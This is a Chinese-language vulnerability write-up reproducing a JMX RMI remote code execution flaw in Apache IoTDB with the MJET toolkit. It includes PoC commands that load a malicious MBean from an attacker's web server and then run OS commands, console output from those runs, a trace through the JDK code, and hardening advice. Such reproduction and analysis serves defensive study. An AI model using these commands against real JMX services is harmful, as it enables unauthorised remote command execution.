这里`poc`使用了`jython`的环境进行调试，先在历史版本下载所需要的`jython`的版本。
下载地址：
然后安装后配置`idea`，为`Jython`项目配置环境。打开`idea`，打开`Preferences`在`Plugins`下，搜索安装插件`python`，点击`install`：
然后就可以创建`jython`项目了。
我们将恶意的`jar`包和`mejt.py`拷贝进去。
配置`poc`如下：
### 漏洞复现
**poc：**
    java -jar jython-standalone-2.7.0.jar mjet.py 10.10.10.182 31999 install super_secret http://10.10.10.182:8000/ 8000
    java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 31999 command super_secret "ls -l" 
首先部署恶意`MBean`，第一个`ip`是易受攻击者`ip`，运行着易受攻击的`JMX`服务，第二个`ip`是攻击者的`ip`，`JMX`服务将连接到攻击者的`Web`服务，以下载有效载荷`jar`文件，`mjet`将在端口`8000`上启动必要的`Web`服务。
成功安装`MBean`后，默认密码将改为命令行提供的密码`super_secret`
    hu4wufu@bogon mjet-master % java -jar jython-standalone-2.7.0.jar mjet.py 10.10.10.182 31999 install super_secret http://10.10.10.182:8000/ 8000
    MJET - MOGWAI LABS JMX Exploitation Toolkit
    ===========================================
    [+] Starting webserver at port 8000   
    [+] Using JMX RMI   
    [+] Connecting to: service:jmx:rmi:///jndi/rmi://10.10.10.182:31999/jmxrmi
    [+] Connected: rmi://10.10.10.182  2
    [+] Loaded javax.management.loading.MLet
    [+] Loading malicious MBean from http://10.10.10.182:8000/
    [+] Invoking: javax.management.loading.MLet.getMBeansFromURL
    10.10.10.182 - - [10/Sep/2020 15:55:33] "GET / HTTP/1.1" 200 -    10.10.10.182 - - [10/Sep/2020 15:55:33] "GET /azmzjazz.jar HTTP/1.1" 200 -    [+] Successfully loaded MBeanMogwaiLabs:name=payload,id=1
    [+] Changing default password...
    [+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
    [+] Successfully changed password
    [+] Done
安装有效负载后，我们执行`OS`命令，在目标中运行命令`“ls -l”`
    hu4wufu@bogon mjet-master % java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 31999 command super_secret "ls -l"
    MJET - MOGWAI LABS JMX Exploitation Toolkit
    ===========================================
    [+] Using JMX RMI
    [+] Connecting to: service:jmx:rmi:///jndi/rmi://127.0.0.1:31999/jmxrmi
    [+] Connected: rmi://10.10.10.182  3
    [+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
    [+] Executing command: ls -l
    total 56
    drwxr-xr-x@ 3 hu4wufu  staff    96  9  7 21:43 data
    -rw-------  1 hu4wufu  staff   165  9  7 15:02 nohup.out
    -rwx------@ 1 hu4wufu  staff  2002 11 20  2019 start-client.bat
    -rwx------@ 1 hu4wufu  staff  1556  9  8 18:14 start-client.sh
    -rwx------@ 1 hu4wufu  staff  3126  9  8 16:36 start-server.bat
    -rwx------@ 1 hu4wufu  staff  2054  9  9 14:41 start-server.sh
    -rwx------  1 hu4wufu  staff  1034  8 26  2019 stop-server.bat
    -rwx------  1 hu4wufu  staff   999  8 26  2019 stop-server.sh
### 漏洞分析
我们先来看一下远程注册`MBean`的过程，这里`payload`使用的是`jython`环境。
首先来解释一下`poc`，每一个`MBean`都需要实现一个接口，而且这个接口的命名是有讲究的，必须以`MBean`结尾，例如这里是编写了一个`MogwailLabsPayloadMBean`接口，然后我们需要实现这个`MBean`，同样这个实现的命名是去掉对应接口的的`MBean`后缀，也就是`MogwailLabsPayload`。在`MogwailLabsPayload`里边的方法，我们注册到`MBeanServer`后面可以随便调用。
根据`poc`，我们来看一下`mjet.py`的`installMode()`函数，往`JMX`里边注册`mjet`。
跟进`installMode()`函数，开始连接`JMX`服务。
跟进`connectToJMX()`函数，这里首先创建`SSL`连接，然后判断`jmxmp`的类型，这里可知是`jxmrmi`，然后就是确定`JMX`的地址和端口。这里一开始将我们设置的参数带入，包括设置的密码，以及`payload`的`url`地址和端口，还有就是就是`JMX`服务地址和端口。
`bean_server`创建结束，主要作用是与`iotDB`里边的`JMX`通信。
接下来跟进去`mjet.py`的`installMBean()`函数，这里`JMX`开始在目标服务器上创建`MBeanjavax.management.loading.MLet`的实例，（然后调用`MLet`实例的`getMBeansFromURL`方法，将`Web`服务器`URL`作为参数进行传递。`JMX`服务将连接到`http`服务器装载的恶意`MBean`对象，也就是事先准备好的`MogwaiLabsPayload`。每个`MBean`都需要都需要一个接口，而且这个接口的命名必须要以`MBean`结尾。
开始加载远程的一个恶意的`MBean`。进行一个远程的方法调用，创建一个`javax.management.loading.MLet`的类对象。
我们跳到了`iotDB`里边，来看一下如何创建一个的`MLet`，最早是调用了`javax.management.remote.rmi.RMIConnectionImpl:239$createMBean()`方法
可以看到传递过来的方法对象，以及`rmi`服务地址。
我们进入`javax.managment.remote.rmi.RMIConnectionImpl:1309$doOperation()`，接下来就是对参数进行操作。
跟进去`doOperation()`方法，`operation`为`3`，调用`MBeanServer.createMBean()`方法。
直接跟进`javax.management.loading.MLet.java`，调用`mlet`的构造方法，开始实例化一个`Mlet`的对象。
加载完成`javax.management.loading.MLet`，开始调用`MBean`实例的`getMBeansFromURL`方法，将`Web`服务器`URL`作为参数进行传递。`JMX`服务将从存放恶意类的`http`服务器上解析恶意的`MBean`，装载恶意的`MBean`对象，也就是事先准备好的`MogwaiLabsPayload`。
同样进行`javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation`的操作，跟进，我们跟到`javax.management.remote.rmi.RMIConnectionImpl$doOperation()`，这里获取`MBeanServer的getdefaultdomain()`，也就是返回`MBean`的默认域。
`com.sun.jmx.interceptor.DefaultMBeanServerInterceptor:1088`，这里`MLet`指定的`MBean`被实例化，并在`MBean`服务器中注册。
最终在`com.sun.jmx.mbeanserver.Repository:489`注册了类型为`Mlet`的恶意的`MBean`。
`operation`为`14`即`javax.management.remote.rmi.RMIConnectionImpl:1468`然后远程调用`Mlet`的`getMBeansFromURL`方法。
`com.sun.jmx.mbeanserver.JmxMBeanServer:801`
成功加载恶意的`MBean`。
接着往下，根据`poc`，开始修改默认密码为一开始命令行输入的参数。
`javax.management.remote.rmi.RMIConnectionImpl$doOperation:1468`
同样先获取恶意`MBean`的实例，反射调用远程方法，这里是`MogwaiLabsPayload`的`changePassword`方法。
开始在`MBeanServer`的注册中心检索名称为`MogwaiLabs`的对象，也就是我们之前加载进去的恶意`MBean`。
至此，恶意的`MBean`已经加载到服务器上，恶意`MBean`可通过`JMX`获取，攻击者可通过密码执行任意命令。
接下来我们来看下命令执行的过程，首先连接`JMX`服务，传入要执行的命令和之前设置的密码。
然后调用`getObjectInstance()`创建之前加载的恶意类的实例。
然后反射远程调用任意方法，这里调用的是`MogwaiLabsPayload`的`runCMD`方法。
最终在调用`ProcessBuilder()`方法执行系统命令。
### 总结
`JMX`漏洞是一个通用型漏洞，如果遇到`java`系统开启`JMX`服务的都可以使用该漏洞`poc`测试一下。
在`iotDB`的`0.9.2`版本以后是默认设置`JMX_LOCAL="true"`关闭远程访问，当想开启远程连接的时候，`JMX_local`改成`false`，这时候就采用用户名密码控制。
所以启用身份验证来保护`JMX`服务是非常重要的，否则的话，`JMX`服务就很容易被攻击者入侵。实际上，`JMX`自身已经提供了这种功能，包括对`TLS`加密连接的支持。
除了启用身份验证之外，还应该确保`JDK`环境是最新的，因为攻击者可能会尝试使用`Java`反序列化漏洞来利用底层`RMI`实现；如果没有及时更新的话，启用了身份验证也无济于事。
### 参考
  * 
  * 
  * 
  * [https://webcache.googleusercontent.com/search?q=cache%3Ahttps%3A%2F%2Fwww.optiv.com%2Fblog%2Fexploiting-jmx-rmi&oq=cache%3Ahttps%3A%2F%2Fwww.optiv.com%2Fblog%2Fexploiting-jmx-rmi&aqs=chrome%E2%80%A669i57j69i58.1641j0j7&sourceid=chrome&ie=UTF-8](https://webcache.googleusercontent.com/search?q=cache%3Ahttps%3A%2F%2Fwww.optiv.com%2Fblog%2Fexploiting-jmx-rmi&oq=cache%3Ahttps%3A%2F%2Fwww.optiv.com%2Fblog%2Fexploiting-jmx-rmi&aqs=chrome%E2%80%A669i57j69i58.1641j0j7&sourceid=chrome&ie=UTF-8)
  * 
  * 
  * 
* * *